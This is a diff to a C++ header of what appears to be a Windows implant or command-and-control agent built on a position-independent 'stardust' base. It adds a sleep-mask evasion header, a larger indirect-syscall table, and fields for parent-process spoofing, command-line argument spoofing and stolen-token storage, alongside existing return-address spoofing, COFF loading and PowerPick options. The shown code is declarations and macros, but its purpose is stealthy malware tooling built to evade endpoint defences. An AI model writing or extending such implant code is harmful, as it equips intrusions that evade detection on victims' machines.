@@ -13,6 +13,7 @@
 #include <native.h>
 #include <resolve.h>
 #include <config.h>
+#include <evasion/sleep_mask_types.h>
 
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
 #include <evasion/spoof.h>
@@ -30,14 +31,14 @@ extern "C" auto RipData() -> uintptr_t;
 extern "C" auto RipStart() -> uintptr_t;
 
 #if defined( DEBUG )
-#define DBG_PRINTF( format, ... ) { ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( __FUNCTION__ ), __LINE__, ##__VA_ARGS__ ); }
-#define DBG_PRINT( inst_ref, format, ... ) { (inst_ref).ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( __FUNCTION__ ), __LINE__, ##__VA_ARGS__ ); }
+#define DBG_PRINTF( format, ... ) { ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( const_cast<char*>(__FUNCTION__) ), __LINE__, ##__VA_ARGS__ ); }
+#define DBG_PRINT( inst_ref, format, ... ) { (inst_ref).ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( const_cast<char*>(__FUNCTION__) ), __LINE__, ##__VA_ARGS__ ); }
 #else
 #define DBG_PRINTF( format, ... ) { ; }
 #define DBG_PRINT( inst_ref, format, ... ) { ; }
 #endif
 
-#ifdef _M_X64
+#ifdef _WIN64
 #define END_OFFSET 0x10
 #else
 #define END_OFFSET 0x10
@@ -53,13 +54,6 @@ namespace stardust
         );
     }
 
-    template <typename T>
-    inline T symbol(const typename std::remove_pointer<T>::type* s) {
-        return reinterpret_cast<T>(
-            reinterpret_cast<uintptr_t>(RipData()) -
-            (reinterpret_cast<uintptr_t>(&RipData) - reinterpret_cast<uintptr_t>(s))
-        );
-    }
 
     class instance {
 
@@ -508,7 +502,7 @@ namespace stardust
                 uint32_t hash;
                 uint16_t ssn;
                 void*    trampoline;
-            } syscall_table[16] = {};
+            } syscall_table[64] = {};
             uint32_t syscall_count = 0;
 
             void*    saved_ret_addr = nullptr;
@@ -549,6 +543,12 @@ namespace stardust
             uint32_t output_length;
             uint32_t output_capacity;
         } coff = {};
+
+        uint32_t ppid_spoof = 0;
+        char*    argue_args = nullptr;
+        uint32_t argue_len  = 0;
+
+        uint8_t  token_store[1280] = {};
 
 #ifdef INCLUDE_CMD_POWERPICK
         struct {
